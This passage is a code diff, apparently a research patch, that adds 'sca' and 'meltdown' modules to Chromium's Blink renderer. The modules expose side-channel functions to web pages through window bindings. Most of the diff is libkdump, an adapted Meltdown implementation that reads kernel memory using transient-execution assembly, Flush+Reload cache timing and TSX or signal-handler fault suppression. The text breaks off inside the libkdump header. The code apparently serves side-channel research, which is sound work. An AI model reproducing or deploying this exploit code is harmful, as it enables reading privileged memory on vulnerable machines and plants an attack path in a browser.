@@ -1,0 +1,4011 @@
+diff --git a/third_party/blink/renderer/bindings/generated_in_modules.gni b/third_party/blink/renderer/bindings/generated_in_modules.gni
+index 3fb1274d8c..20cac97180 100644
+--- a/third_party/blink/renderer/bindings/generated_in_modules.gni
++++ b/third_party/blink/renderer/bindings/generated_in_modules.gni
+@@ -2137,6 +2137,10 @@ generated_interface_sources_in_modules = [
+   "$root_gen_dir/third_party/blink/renderer/bindings/modules/v8/v8_rtc_track_event.h",
+   "$root_gen_dir/third_party/blink/renderer/bindings/modules/v8/v8_sanitizer.cc",
+   "$root_gen_dir/third_party/blink/renderer/bindings/modules/v8/v8_sanitizer.h",
++  "$root_gen_dir/third_party/blink/renderer/bindings/modules/v8/v8_sca.cc",
++  "$root_gen_dir/third_party/blink/renderer/bindings/modules/v8/v8_sca.h",
++  "$root_gen_dir/third_party/blink/renderer/bindings/modules/v8/v8_meltdown.cc",
++  "$root_gen_dir/third_party/blink/renderer/bindings/modules/v8/v8_meltdown.h",
+   "$root_gen_dir/third_party/blink/renderer/bindings/modules/v8/v8_scheduler.cc",
+   "$root_gen_dir/third_party/blink/renderer/bindings/modules/v8/v8_scheduler.h",
+   "$root_gen_dir/third_party/blink/renderer/bindings/modules/v8/v8_screen.cc",
+diff --git a/third_party/blink/renderer/bindings/idl_in_modules.gni b/third_party/blink/renderer/bindings/idl_in_modules.gni
+index e52909ef88..f332403a12 100644
+--- a/third_party/blink/renderer/bindings/idl_in_modules.gni
++++ b/third_party/blink/renderer/bindings/idl_in_modules.gni
+@@ -631,6 +631,10 @@ static_idl_files_in_modules = get_path_info(
+           "//third_party/blink/renderer/modules/sanitizer_api/element_sanitizer.idl",
+           "//third_party/blink/renderer/modules/sanitizer_api/sanitizer.idl",
+           "//third_party/blink/renderer/modules/sanitizer_api/sanitizer_config.idl",
++          "//third_party/blink/renderer/modules/sca/sca.idl",
++          "//third_party/blink/renderer/modules/sca/window_sca.idl",
++          "//third_party/blink/renderer/modules/sca/meltdown.idl",
++          "//third_party/blink/renderer/modules/sca/window_meltdown.idl",
+           "//third_party/blink/renderer/modules/scheduler/scheduler.idl",
+           "//third_party/blink/renderer/modules/scheduler/scheduler_post_task_callback.idl",
+           "//third_party/blink/renderer/modules/scheduler/scheduler_post_task_options.idl",
+diff --git a/third_party/blink/renderer/modules/BUILD.gn b/third_party/blink/renderer/modules/BUILD.gn
+index 9c2d9c9c2a..2e7268fa93 100644
+--- a/third_party/blink/renderer/modules/BUILD.gn
++++ b/third_party/blink/renderer/modules/BUILD.gn
+@@ -132,6 +132,7 @@ component("modules") {
+     "//third_party/blink/renderer/modules/remoteplayback",
+     "//third_party/blink/renderer/modules/sanitizer_api",
+     "//third_party/blink/renderer/modules/scheduler",
++    "//third_party/blink/renderer/modules/sca",
+     "//third_party/blink/renderer/modules/screen_enumeration",
+     "//third_party/blink/renderer/modules/screen_orientation",
+     "//third_party/blink/renderer/modules/sensor",
+diff --git a/third_party/blink/renderer/modules/sca/BUILD.gn b/third_party/blink/renderer/modules/sca/BUILD.gn
+new file mode 100644
+index 0000000000..36ec994925
+--- /dev/null
++++ b/third_party/blink/renderer/modules/sca/BUILD.gn
+@@ -0,0 +1,18 @@
++# Author: Jonathan Busch (jonathan.busch@pm.me), 2022
++
++import("//third_party/blink/renderer/modules/modules.gni")
++
++blink_modules_sources("sca") {
++  sources = [
++    "sca.cc",
++    "sca.h",
++    "dom_window_sca.cc",
++    "dom_window_sca.h",
++    "libkdump.cc",
++    "libkdump.h",
++    "meltdown.cc",
++    "meltdown.h",
++    "dom_window_meltdown.cc",
++    "dom_window_meltdown.h",
++  ]
++}
+diff --git a/third_party/blink/renderer/modules/sca/dom_window_meltdown.cc b/third_party/blink/renderer/modules/sca/dom_window_meltdown.cc
+new file mode 100644
+index 0000000000..292072bdeb
+--- /dev/null
++++ b/third_party/blink/renderer/modules/sca/dom_window_meltdown.cc
+@@ -0,0 +1,47 @@
++/**
++ * @file dom_window_meltdown.cc
++ * @author Jonathan Busch (jonathan.busch@pm.me)
++ * @version 0.1
++ * @date 2022-01-21
++ *
++ * @copyright Copyright (c) 2022
++ *
++ */
++#include "third_party/blink/renderer/modules/sca/dom_window_meltdown.h"
++
++#include "third_party/blink/renderer/core/frame/local_dom_window.h"
++#include "third_party/blink/renderer/modules/sca/meltdown.h"
++
++namespace blink {
++
++DOMWindowMeltdown::DOMWindowMeltdown(LocalDOMWindow& window)
++    : Supplement<LocalDOMWindow>(window) {}
++
++const char DOMWindowMeltdown::kSupplementName[] = "DOMWindowMeltdown";
++
++DOMWindowMeltdown& DOMWindowMeltdown::From(LocalDOMWindow& window) {
++  DOMWindowMeltdown* supplement =
++      Supplement<LocalDOMWindow>::From<DOMWindowMeltdown>(window);
++  if (!supplement) {
++    supplement = MakeGarbageCollected<DOMWindowMeltdown>(window);
++    ProvideTo(window, supplement);
++  }
++  return *supplement;
++}
++
++Meltdown* DOMWindowMeltdown::meltdown(LocalDOMWindow& window) {
++  return DOMWindowMeltdown::From(window).meltdown();
++}
++
++Meltdown* DOMWindowMeltdown::meltdown() const {
++  if (!meltdown_)
++    meltdown_ = MakeGarbageCollected<Meltdown>();
++  return meltdown_.Get();
++}
++
++void DOMWindowMeltdown::Trace(Visitor* visitor) const {
++  visitor->Trace(meltdown_);
++  Supplement<LocalDOMWindow>::Trace(visitor);
++}
++
++}  // namespace blink
+diff --git a/third_party/blink/renderer/modules/sca/dom_window_meltdown.h b/third_party/blink/renderer/modules/sca/dom_window_meltdown.h
+new file mode 100644
+index 0000000000..096df24a72
+--- /dev/null
++++ b/third_party/blink/renderer/modules/sca/dom_window_meltdown.h
+@@ -0,0 +1,41 @@
++/**
++ * @file dom_window_meltdown.h
++ * @author Jonathan Busch (jonathan.busch@pm.me)
++ * @version 0.1
++ * @date 2022-01-21
++ *
++ * @copyright Copyright (c) 2022
++ *
++ */
++#ifndef THIRD_PARTY_BLINK_RENDERER_MODULES_SCA_DOM_WINDOW_MELTDOWN_H_
++#define THIRD_PARTY_BLINK_RENDERER_MODULES_SCA_DOM_WINDOW_MELTDOWN_H_
++
++#include "third_party/blink/renderer/platform/heap/handle.h"
++#include "third_party/blink/renderer/platform/supplementable.h"
++
++namespace blink {
++
++class Meltdown;
++class LocalDOMWindow;
++
++class DOMWindowMeltdown final : public GarbageCollected<DOMWindowMeltdown>,
++                                public Supplement<LocalDOMWindow> {
++ public:
++  static const char kSupplementName[];
++
++  static DOMWindowMeltdown& From(LocalDOMWindow&);
++  static Meltdown* meltdown(LocalDOMWindow&);
++
++  explicit DOMWindowMeltdown(LocalDOMWindow&);
++
++  Meltdown* meltdown() const;
++
++  void Trace(Visitor*) const override;
++
++ private:
++  mutable Member<Meltdown> meltdown_;
++};
++
++}  // namespace blink
++
++#endif  // THIRD_PARTY_BLINK_RENDERER_MODULES_SCA_DOM_WINDOW_MELTDOWN_H_
+diff --git a/third_party/blink/renderer/modules/sca/dom_window_sca.cc b/third_party/blink/renderer/modules/sca/dom_window_sca.cc
+new file mode 100644
+index 0000000000..749d435728
+--- /dev/null
++++ b/third_party/blink/renderer/modules/sca/dom_window_sca.cc
+@@ -0,0 +1,47 @@
++/**
++ * @file dom_window_sca.cc
++ * @author Jonathan Busch (jonathan.busch@pm.me)
++ * @version 0.1
++ * @date 2022-01-21
++ *
++ * @copyright Copyright (c) 2022
++ *
++ */
++#include "third_party/blink/renderer/modules/sca/dom_window_sca.h"
++
++#include "third_party/blink/renderer/core/frame/local_dom_window.h"
++#include "third_party/blink/renderer/modules/sca/sca.h"
++
++namespace blink {
++
++DOMWindowSca::DOMWindowSca(LocalDOMWindow& window)
++    : Supplement<LocalDOMWindow>(window) {}
++
++const char DOMWindowSca::kSupplementName[] = "DOMWindowSca";
++
++DOMWindowSca& DOMWindowSca::From(LocalDOMWindow& window) {
++  DOMWindowSca* supplement =
++      Supplement<LocalDOMWindow>::From<DOMWindowSca>(window);
++  if (!supplement) {
++    supplement = MakeGarbageCollected<DOMWindowSca>(window);
++    ProvideTo(window, supplement);
++  }
++  return *supplement;
++}
++
++Sca* DOMWindowSca::sca(LocalDOMWindow& window) {
++  return DOMWindowSca::From(window).sca();
++}
++
++Sca* DOMWindowSca::sca() const {
++  if (!sca_)
++    sca_ = MakeGarbageCollected<Sca>();
++  return sca_.Get();
++}
++
++void DOMWindowSca::Trace(Visitor* visitor) const {
++  visitor->Trace(sca_);
++  Supplement<LocalDOMWindow>::Trace(visitor);
++}
++
++}  // namespace blink
+diff --git a/third_party/blink/renderer/modules/sca/dom_window_sca.h b/third_party/blink/renderer/modules/sca/dom_window_sca.h
+new file mode 100644
+index 0000000000..9985663258
+--- /dev/null
++++ b/third_party/blink/renderer/modules/sca/dom_window_sca.h
+@@ -0,0 +1,41 @@
++/**
++ * @file dom_window_sca.h
++ * @author Jonathan Busch (jonathan.busch@pm.me)
++ * @version 0.1
++ * @date 2022-01-21
++ *
++ * @copyright Copyright (c) 2022
++ *
++ */
++#ifndef THIRD_PARTY_BLINK_RENDERER_MODULES_SCA_DOM_WINDOW_SCA_H_
++#define THIRD_PARTY_BLINK_RENDERER_MODULES_SCA_DOM_WINDOW_SCA_H_
++
++#include "third_party/blink/renderer/platform/heap/handle.h"
++#include "third_party/blink/renderer/platform/supplementable.h"
++
++namespace blink {
++
++class Sca;
++class LocalDOMWindow;
++
++class DOMWindowSca final : public GarbageCollected<DOMWindowSca>,
++                           public Supplement<LocalDOMWindow> {
++ public:
++  static const char kSupplementName[];
++
++  static DOMWindowSca& From(LocalDOMWindow&);
++  static Sca* sca(LocalDOMWindow&);
++
++  explicit DOMWindowSca(LocalDOMWindow&);
++
++  Sca* sca() const;
++
++  void Trace(Visitor*) const override;
++
++ private:
++  mutable Member<Sca> sca_;
++};
++
++}  // namespace blink
++
++#endif  // THIRD_PARTY_BLINK_RENDERER_MODULES_SCA_DOM_WINDOW_SCA_H_
+diff --git a/third_party/blink/renderer/modules/sca/idls.gni b/third_party/blink/renderer/modules/sca/idls.gni
+new file mode 100644
+index 0000000000..e697b710b2
+--- /dev/null
++++ b/third_party/blink/renderer/modules/sca/idls.gni
+@@ -0,0 +1,10 @@
++# Author: Jonathan Busch (jonathan.busch@pm.me), 2022
++modules_idl_files = [
++  "sca.idl",
++  "meltdown.idl",
++]
++
++modules_dependency_idl_files = [
++  "window_sca.idl",
++  "window_meltdown.idl",
++]
+diff --git a/third_party/blink/renderer/modules/sca/libkdump.cc b/third_party/blink/renderer/modules/sca/libkdump.cc
+new file mode 100644
+index 0000000000..ef62f40d4f
+--- /dev/null
++++ b/third_party/blink/renderer/modules/sca/libkdump.cc
+@@ -0,0 +1,609 @@
++/// Source: https://github.com/IAIK/meltdown
++/// Edited by Jonathan Busch (jonathan.busch@pm.me)
++#include "libkdump.h"
++#include <cpuid.h>
++#include <errno.h>
++#include <fcntl.h>
++#include <memory.h>
++#ifdef __linux__
++#include <pthread.h>
++#include <sched.h>
++#include <unistd.h>
++#endif
++#include <setjmp.h>
++#include <signal.h>
++#include <stdarg.h>
++#include <stdlib.h>
++
++libkdump_config_t libkdump_auto_config = {0};
++
++// ---------------------------------------------------------------------------
++static jmp_buf buf;
++
++#ifdef __linux__
++static char *_mem = NULL, *mem = NULL;
++static pthread_t* load_thread;
++
++static size_t phys = 0;
++#endif
++static int dbg = 0;
++
++static libkdump_config_t config;
++
++#ifndef ETIME
++#define ETIME 62
++#endif
++
++#if defined(NO_TSX) && defined(FORCE_TSX)
++#error NO_TSX and FORCE_TSX cannot be used together!
++#endif
++
++#ifndef NO_TSX
++#define _XBEGIN_STARTED (~0u)
++#endif
++
++#if defined(__i386__) && defined(FORCE_TSX)
++#undef FORCE_TSX
++#warning TSX cannot be forced on __i386__ platform, proceeding with compilation without it
++#endif
++
++#ifdef __x86_64__
++
++// ---------------------------------------------------------------------------
++#define meltdown                      \
++  asm volatile(                       \
++      "1:\n"                          \
++      "movq (%%rsi), %%rsi\n"         \
++      "movzx (%%rcx), %%rax\n"        \
++      "shl $12, %%rax\n"              \
++      "jz 1b\n"                       \
++      "movq (%%rbx,%%rax,1), %%rbx\n" \
++      :                               \
++      : "c"(phys), "b"(mem), "S"(0)   \
++      : "rax");
++
++// ---------------------------------------------------------------------------
++#define meltdown_nonull               \
++  asm volatile(                       \
++      "1:\n"                          \
++      "movzbq (%%rcx), %%rax\n"       \
++      "shl $12, %%rax\n"              \
++      "jz 1b\n"                       \
++      "movq (%%rbx,%%rax,1), %%rbx\n" \
++      :                               \
++      : "c"(phys), "b"(mem)           \
++      : "rax");
++
++// ---------------------------------------------------------------------------
++#define meltdown_fast                 \
++  asm volatile(                       \
++      "movzx (%%rcx), %%rax\n"        \
++      "shl $12, %%rax\n"              \
++      "movq (%%rbx,%%rax,1), %%rbx\n" \
++      :                               \
++      : "c"(phys), "b"(mem)           \
++      : "rax");
++
++#else /* __i386__ */
++
++// ---------------------------------------------------------------------------
++#define meltdown                     \
++  asm volatile(                      \
++      "1:\n"                         \
++      "movl (%%esi), %%esi\n"        \
++      "movzx (%%ecx), %%eax\n"       \
++      "shl $12, %%eax\n"             \
++      "jz 1b\n"                      \
++      "mov (%%ebx,%%eax,1), %%ebx\n" \
++      :                              \
++      : "c"(phys), "b"(mem), "S"(0)  \
++      : "eax");
++
++// ---------------------------------------------------------------------------
++#define meltdown_nonull              \
++  asm volatile(                      \
++      "1:\n"                         \
++      "movzx (%%ecx), %%eax\n"       \
++      "shl $12, %%eax\n"             \
++      "jz 1b\n"                      \
++      "mov (%%ebx,%%eax,1), %%ebx\n" \
++      :                              \
++      : "c"(phys), "b"(mem)          \
++      : "eax");
++
++// ---------------------------------------------------------------------------
++#define meltdown_fast                \
++  asm volatile(                      \
++      "movzx (%%ecx), %%eax\n"       \
++      "shl $12, %%eax\n"             \
++      "mov (%%ebx,%%eax,1), %%ebx\n" \
++      :                              \
++      : "c"(phys), "b"(mem)          \
++      : "eax");
++#endif
++
++#ifndef MELTDOWN
++#define MELTDOWN meltdown_nonull
++#endif
++
++// ---------------------------------------------------------------------------
++typedef enum { ERROR, INFO, SUCCESS } d_sym_t;
++
++// ---------------------------------------------------------------------------
++static void debug(d_sym_t symbol, const char* fmt, ...) {
++  if (!dbg)
++    return;
++
++  switch (symbol) {
++    case ERROR:
++      printf("\x1b[31;1m[-]\x1b[0m ");
++      break;
++    case INFO:
++      printf("\x1b[33;1m[.]\x1b[0m ");
++      break;
++    case SUCCESS:
++      printf("\x1b[32;1m[+]\x1b[0m ");
++      break;
++    default:
++      break;
++  }
++  va_list ap;
++  va_start(ap, fmt);
++  vfprintf(stdout, fmt, ap);
++  va_end(ap);
++}
++
++// ---------------------------------------------------------------------------
++uint64_t libkdump_rdtsc() {
++  uint64_t a = 0, d = 0;
++  asm volatile("mfence");
++#if defined(USE_RDTSCP) && defined(__x86_64__)
++  asm volatile("rdtscp" : "=a"(a), "=d"(d)::"rcx");
++#elif defined(USE_RDTSCP) && defined(__i386__)
++  asm volatile("rdtscp" : "=A"(a), ::"ecx");
++#elif defined(__x86_64__)
++  asm volatile("rdtsc" : "=a"(a), "=d"(d));
++#elif defined(__i386__)
++  asm volatile("rdtsc" : "=A"(a));
++#endif
++  a = (d << 32) | a;
++  asm volatile("mfence");
++  return a;
++}
++
++#if defined(__x86_64__)
++// ---------------------------------------------------------------------------
++void libkdump_maccess(void* p) {
++  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
++}
++
++// ---------------------------------------------------------------------------
++void libkdump_flush(void* p) {
++  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
++}
++#else
++// ---------------------------------------------------------------------------
++void libkdump_maccess(void* p) {
++  asm volatile("movl (%0), %%eax\n" : : "c"(p) : "eax");
++}
++
++// ---------------------------------------------------------------------------
++void libkdump_flush(void* p) {
++  asm volatile("clflush 0(%0)\n" : : "c"(p) : "eax");
++}
++#endif
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] static int __attribute__((always_inline))
++flush_reload(void* ptr) {
++  uint64_t start = 0, end = 0;
++
++  start = libkdump_rdtsc();
++  libkdump_maccess(ptr);
++  end = libkdump_rdtsc();
++
++  libkdump_flush(ptr);
++
++  if (end - start < config.cache_miss_threshold) {
++    return 1;
++  }
++  return 0;
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] static void* nopthread(void* dummy) {
++#ifdef __linux__
++  while (1) {
++    asm volatile("nop");
++  }
++#else
++  return 0;
++#endif
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] static void* syncthread(void* dummy) {
++#ifdef __linux__
++  while (1) {
++    sync();
++  }
++#else
++  return 0;
++#endif
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] static void* yieldthread(void* dummy) {
++#ifdef __linux__
++  while (1) {
++    sched_yield();
++  }
++#else
++  return 0;
++#endif
++}
++
++#ifndef NO_TSX
++// ---------------------------------------------------------------------------
++[[maybe_unused]] static __attribute__((always_inline)) inline unsigned int
++xbegin(void) {
++  unsigned status;
++  // asm volatile("xbegin 1f \n 1:" : "=a"(status) : "a"(-1UL) : "memory");
++  asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00"
++               : "=a"(status)
++               : "a"(-1UL)
++               : "memory");
++  return status;
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] static __attribute__((always_inline)) inline void xend(void) {
++  // asm volatile("xend" ::: "memory");
++  asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory");
++}
++#endif
++
++// ---------------------------------------------------------------------------
++static int check_tsx() {
++#if !defined(NO_TSX) && !defined(FORCE_TSX)
++  if (__get_cpuid_max(0, NULL) >= 7) {
++    unsigned a, b, c, d;
++    __cpuid_count(7, 0, a, b, c, d);
++    return (b & (1 << 11)) ? 1 : 0;
++  } else
++    return 0;
++#elif defined(FORCE_TSX)
++  return 1;
++#else /* defined (NO_TSX) */
++  return 0;
++#endif
++}
++
++// ---------------------------------------------------------------------------
++static void detect_fault_handling() {
++  if (check_tsx()) {
++    debug(SUCCESS, "Using Intel TSX\n");
++    config.fault_handling = TSX;
++  } else {
++    debug(INFO, "No Intel TSX, fallback to signal handler\n");
++    config.fault_handling = SIGNAL_HANDLER;
++  }
++}
++
++// ---------------------------------------------------------------------------
++void detect_flush_reload_threshold() {
++  size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
++  size_t dummy[16];
++  size_t* ptr = dummy + 8;
++  uint64_t start = 0, end = 0;
++
++  libkdump_maccess(ptr);
++  for (i = 0; i < count; i++) {
++    start = libkdump_rdtsc();
++    libkdump_maccess(ptr);
++    end = libkdump_rdtsc();
++    reload_time += (end - start);
++  }
++  for (i = 0; i < count; i++) {
++    start = libkdump_rdtsc();
++    libkdump_maccess(ptr);
++    end = libkdump_rdtsc();
++    libkdump_flush(ptr);
++    flush_reload_time += (end - start);
++  }
++  reload_time /= count;
++  flush_reload_time /= count;
++
++  debug(INFO, "Flush+Reload: %zd cycles, Reload only: %zd cycles\n",
++        flush_reload_time, reload_time);
++  config.cache_miss_threshold = (flush_reload_time + reload_time * 2) / 3;
++  debug(SUCCESS, "Flush+Reload threshold: %zd cycles\n",
++        config.cache_miss_threshold);
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] static void auto_config() {
++  debug(INFO, "Auto configuration\n");
++  detect_fault_handling();
++  detect_flush_reload_threshold();
++  config.measurements = 3;
++  config.accept_after = 1;
++  config.load_threads = 1;
++  config.load_type = NOP;
++  config.retries = 10000;
++  config.physical_offset = DEFAULT_PHYSICAL_OFFSET;
++}
++
++// ---------------------------------------------------------------------------
++
++std::string config_to_string(libkdump_config_t con) {
++  return "Cache miss threshold: " + std::to_string(con.cache_miss_threshold) +
++         "\nFault handling: " + fault_handling_to_string(con.fault_handling) +
++         "\nMeasurements: " + std::to_string(con.measurements) +
++         "\nAccept after: " + std::to_string(con.accept_after) +
++         "\nLoad threads: " + std::to_string(con.load_threads) +
++         "\nLoad type: " + load_type_to_string(con.load_type) +
++         "\nRetries: " + std::to_string(con.retries) +
++         "\nPhysical offset: " + std::to_string(con.physical_offset);
++}
++// ---------------------------------------------------------------------------
++
++libkdump_config_t get_current_config() {
++  return config;
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] static int check_config() {
++  if (config.cache_miss_threshold <= 0) {
++    detect_flush_reload_threshold();
++  }
++  if (config.cache_miss_threshold <= 0) {
++    errno = ETIME;
++    return -1;
++  }
++  return 0;
++}
++
++// ---------------------------------------------------------------------------
++static void unblock_signal(int signum __attribute__((__unused__))) {
++#ifdef __linux__
++  sigset_t sigs;
++  sigemptyset(&sigs);
++  sigaddset(&sigs, signum);
++  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
++#endif
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] static void segfault_handler(int signum) {
++  (void)signum;
++  unblock_signal(SIGSEGV);
++  longjmp(buf, 1);
++}
++
++// ---------------------------------------------------------------------------
++libkdump_config_t libkdump_get_autoconfig() {
++  auto_config();
++  return config;
++}
++
++// ---------------------------------------------------------------------------
++int libkdump_init(const libkdump_config_t configuration) {
++#ifdef __linux__
++  int j;
++  config = configuration;
++  if (memcmp(&config, &libkdump_auto_config, sizeof(libkdump_config_t)) == 0) {
++    auto_config();
++  }
++
++  int err = check_config();
++  if (err != 0) {
++    errno = err;
++    return -1;
++  }
++  _mem = (char*)malloc(4096 * 300);
++  if (!_mem) {
++    errno = ENOMEM;
++    return -1;
++  }
++  mem = (char*)(((size_t)_mem & ~0xfff) + 0x1000 * 2);
++  memset(mem, 0xab, 4096 * 290);
++
++  for (j = 0; j < 256; j++) {
++    libkdump_flush(mem + j * 4096);
++  }
++
++  load_thread = (pthread_t*)malloc(sizeof(pthread_t) * config.load_threads);
++  void* thread_func;
++  switch (config.load_type) {
++    case IO:
++      thread_func = (void*)syncthread;
++      break;
++    case YIELD:
++      thread_func = (void*)yieldthread;
++      break;
++    case NOP:
++    default:
++      thread_func = (void*)nopthread;
++  }
++
++  for (j = 0; j < config.load_threads; j++) {
++    int r =
++        pthread_create(&load_thread[j], 0, (void* (*)(void*))thread_func, 0);
++    if (r != 0) {
++      int k;
++      for (k = 0; k < j; k++) {
++        pthread_cancel(load_thread[k]);
++      }
++      free(load_thread);
++      free(_mem);
++      errno = r;
++      return -1;
++    }
++  }
++  debug(SUCCESS, "Started %d load threads\n", config.load_threads);
++
++  if (config.fault_handling == SIGNAL_HANDLER) {
++    if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
++      debug(ERROR, "Failed to setup signal handler\n");
++      libkdump_cleanup();
++      return -1;
++    }
++    debug(SUCCESS, "Successfully setup signal handler\n");
++  }
++#endif
++  return 0;
++}
++
++// ---------------------------------------------------------------------------
++int libkdump_cleanup() {
++#ifdef __linux__
++  int j;
++  if (config.fault_handling == SIGNAL_HANDLER) {
++    signal(SIGSEGV, SIG_DFL);
++  }
++
++  for (j = 0; j < config.load_threads; j++) {
++    pthread_cancel(load_thread[j]);
++  }
++  free(load_thread);
++  free(_mem);
++  debug(SUCCESS, "Everything is cleaned up, good bye!\n");
++#endif
++  return 0;
++}
++
++// ---------------------------------------------------------------------------
++size_t libkdump_phys_to_virt(size_t addr) {
++  /* we are given full address (kernel or physical) here */
++  if (addr + config.physical_offset < config.physical_offset)
++    return addr;
++
++#ifdef __x86_64__
++  /* address given is bigger than identity mapping 64TB  */
++  if (addr >= (64ULL * 1024ULL * 1024ULL * 1024ULL * 1024ULL)) {
++    debug(ERROR, "phys_to_virt argument is > 64 TB\n");
++    return -1ULL;
++  }
++#endif
++
++  return addr + config.physical_offset;
++}
++
++// ---------------------------------------------------------------------------
++void libkdump_enable_debug(int enable) {
++  dbg = enable;
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] static int __attribute__((always_inline)) read_value() {
++#ifdef __linux__
++  int i, hit = 0;
++  for (i = 0; i < 256; i++) {
++    if (flush_reload(mem + i * 4096)) {
++      hit = i + 1;
++    }
++    sched_yield();
++  }
++  return hit - 1;
++#else
++  return 0;
++#endif
++}
++
++// ---------------------------------------------------------------------------
++int __attribute__((noinline)) libkdump_read_tsx() {
++#ifdef __linux__
++#ifndef NO_TSX
++  size_t retries = config.retries + 1;
++  // uint64_t start = 0, end = 0;
++
++  while (retries--) {
++    if (xbegin() == _XBEGIN_STARTED) {
++      MELTDOWN;
++      xend();
++    }
++    int i;
++    for (i = 0; i < 256; i++) {
++      if (flush_reload(mem + i * 4096)) {
++        if (i >= 1) {
++          return i;
++        }
++      }
++      sched_yield();
++    }
++    sched_yield();
++  }
++#endif
++#endif
++  return 0;
++}
++
++// ---------------------------------------------------------------------------
++int __attribute__((noinline)) libkdump_read_signal_handler() {
++#ifdef __linux__
++  size_t retries = config.retries + 1;
++  // uint64_t start = 0, end = 0;
++
++  while (retries--) {
++    if (!setjmp(buf)) {
++      MELTDOWN;
++    }
++
++    int i;
++    for (i = 0; i < 256; i++) {
++      if (flush_reload(mem + i * 4096)) {
++        if (i >= 1) {
++          return i;
++        }
++      }
++      sched_yield();
++    }
++    sched_yield();
++  }
++#endif
++  return 0;
++}
++
++// ---------------------------------------------------------------------------
++int libkdump_read(size_t addr) {
++#ifdef __linux__
++  phys = addr;
++
++  char res_stat[256];
++  int i, r;
++  size_t j;
++  for (i = 0; i < 256; i++)
++    res_stat[i] = 0;
++
++  sched_yield();
++
++  for (i = 0; i < config.measurements; i++) {
++    if (config.fault_handling == TSX) {
++      r = libkdump_read_tsx();
++    } else {
++      r = libkdump_read_signal_handler();
++    }
++    res_stat[r]++;
++  }
++  int max_v = 0, max_i = 0;
++
++  if (dbg) {
++    for (j = 0; j < sizeof(res_stat); j++) {
++      if (res_stat[j] == 0)
++        continue;
++      debug(INFO, "res_stat[%x] = %d\n", j, res_stat[j]);
++    }
++  }
++
++  for (i = 1; i < 256; i++) {
++    if (res_stat[i] > max_v && res_stat[i] >= config.accept_after) {
++      max_v = res_stat[i];
++      max_i = i;
++    }
++  }
++  return max_i;
++#else
++  return 0;
++#endif
++}
+diff --git a/third_party/blink/renderer/modules/sca/libkdump.h b/third_party/blink/renderer/modules/sca/libkdump.h
+new file mode 100644
+index 0000000000..19633f1572
+--- /dev/null
++++ b/third_party/blink/renderer/modules/sca/libkdump.h
+@@ -0,0 +1,162 @@
++/// Source: https://github.com/IAIK/meltdown
++/// Edited by Jonathan Busch (jonathan.busch@pm.me)
++#ifndef _LIBKDUMP_H_
++#define _LIBKDUMP_H_
++
++#include <stdint.h>
++#include <stdio.h>
++#include <string>
++
++#if !(defined(__x86_64__) || defined(__i386__))
++#error x86-64 and i386 are the only supported architectures
++#endif
++
++#ifdef __x86_64__
++#define DEFAULT_PHYSICAL_OFFSET 0xffff880000000000ull
++#else
++#define DEFAULT_PHYSICAL_OFFSET 0xc0000000ull
++#endif
++
++/**
++ * libkdump exception handling
++ */
++typedef enum {
++  SIGNAL_HANDLER, /**< Install a signal handler to catch SIGSEGV */
++  TSX             /**< Use Intel TSX to suppress exception */
++} libkdump_fault_handling_t;
++
++inline std::string fault_handling_to_string(libkdump_fault_handling_t v) {
++  switch (v) {
++    case SIGNAL_HANDLER:
++      return "SIGNAL_HANDLER";
++    case TSX:
++      return "TSX";
++    default:
++      return "UNKNOWN";
++  }
++}
++
++inline libkdump_fault_handling_t fault_handling_to_enum(std::string v) {
++  if (v.compare("TSX") == 0) {
++    return TSX;
++  }
++  return SIGNAL_HANDLER;
++}
++
++/**
++ * libkdump load thread action
++ */
++typedef enum {
++  NOP,  /**< Just run an endless loop */
++  IO,   /**< Perform I/O operations to trigger interrupts */
++  YIELD /**< Continuously switch to the operating system */
++} libkdump_load_t;
++
++inline std::string load_type_to_string(libkdump_load_t v) {
++  switch (v) {
++    case NOP:
++      return "NOP";
++    case IO:
++      return "IO";
++    case YIELD:
++      return "YIELD";
++    default:
++      return "UNKNOWN";
++  }
++}
++
++inline libkdump_load_t load_type_to_enum(std::string v) {
++  if (v.compare("IO") == 0) {
++    return IO;
++  }
++  if (v.compare("YIELD") == 0) {
++    return YIELD;
++  }
++  return NOP;
++}
++
++/**
++ * libkdump configuration
++ */
++typedef struct {
++  size_t cache_miss_threshold; /**< Cache miss threshold in cycles for
++                                  Flush+Reload */
++  libkdump_fault_handling_t
++      fault_handling; /**< Type of fault handling (TSX or signal handler) */
++  int measurements;   /**< Number of measurements to perform for one address */
++  int accept_after;   /**< How many measurements must be the same to accept the
++                         read value */
++  int load_threads;   /**< Number of threads which are started to increase the
++                         chance of reading from inaccessible addresses */
++  libkdump_load_t load_type; /**< Function the load threads should execute */
++  int retries;               /**< Number of Meltdown retries for an address */
++  size_t physical_offset;    /**< Address of the physical direct map */
++} libkdump_config_t;
++
++std::string config_to_string(libkdump_config_t con);
++
++libkdump_config_t get_current_config();
++
++uint64_t libkdump_rdtsc();
++
++void libkdump_maccess(void* p);
++
++void libkdump_flush(void* p);
++
++extern libkdump_config_t libkdump_auto_config;
++
++/**
++ * Initializes libkdump
++ *
++ * @param[in] configuration The configuration for libkdump, or
++ * 'libkdump_auto_config' for auto configuration.
++ *
++ * @return 0 Initialization was successful
++ * @return -1 Initialization failed, errno contains the error code
++ */
++int libkdump_init(const libkdump_config_t configuration);
++
++/**
++ * Returns a config to be used with libkdump_init. All parameters are
++ * automatically configured to sane defaults.
++ *
++ * @return A libkdump configuration (libkdump_config_t)
++ */
++libkdump_config_t libkdump_get_autoconfig();
++
++/**
++ * Reads one character from the given (virtual) address using Meltdown
++ *
++ * @param[in] addr The virtual address to read from
++ *
++ * @return The read character
++ */
++int libkdump_read(size_t addr);
++
++/**
++ * Cleans up and reverts everything which was changed by libkdump.
++ *
